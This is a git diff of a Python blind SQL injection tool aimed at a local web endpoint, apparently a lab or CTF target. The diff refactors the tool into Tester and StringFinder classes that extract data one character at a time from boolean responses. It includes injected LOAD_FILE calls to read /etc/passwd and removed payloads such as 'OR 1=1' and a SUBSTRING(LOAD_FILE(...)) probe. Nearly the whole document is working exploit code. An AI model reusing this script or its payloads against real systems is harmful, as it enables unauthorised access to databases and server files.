@@ -5,16 +5,9 @@ import sys
 
 from tools import *
 from payloads import *
-
-
-
-#payload = " AND SUBSTRING(LOAD_FILE({}),0,1)!={}".format(
-#	encode_str('config.php'),
-#	encode_str('<'))
-
-
-def count_payload(i):
-	return "OR (SELECT command FROM job)=1 OR 1=1"
+from body_conditions import *
+from tester import Tester
+from string_finder import StringFinder
 
 
 def test(payload):
@@ -23,8 +16,22 @@ def test(payload):
 	#print(r.request.url)
 	return 'admin' not in r.text
 
+class MyTester(Tester):
 
-def read_file(file):
+    def __init__(self):
+        super(MyTester, self).__init__(lambda r : 'admin' in r.text)
+    
+    def get_request(self, payload):
+        return requests.get('http://127.0.0.1:8181/comment.php', params={'id':'1 {}'.format(payload)}, verify=False)
+
+sf = StringFinder(MyTester())
+
+print(sf.read_string("(SELECT {})".format(encode_str('coucou'))))
+
+def read_file(filename):
+	return read_string("LOAD_FILE({})".format(encode_str('/etc/passwd')))
+
+def read_file__(file):
 	index = 1
 	str = ''
 	while True:
@@ -47,7 +54,7 @@ def read_file(file):
 
 # print(test("UNION ALL SELECT 1 as cmd"))
 
-read_file('/etc/passwd')
+#read_file('/etc/passwd')
 
 #print(test(file_exists('/etc/passwd')))
 
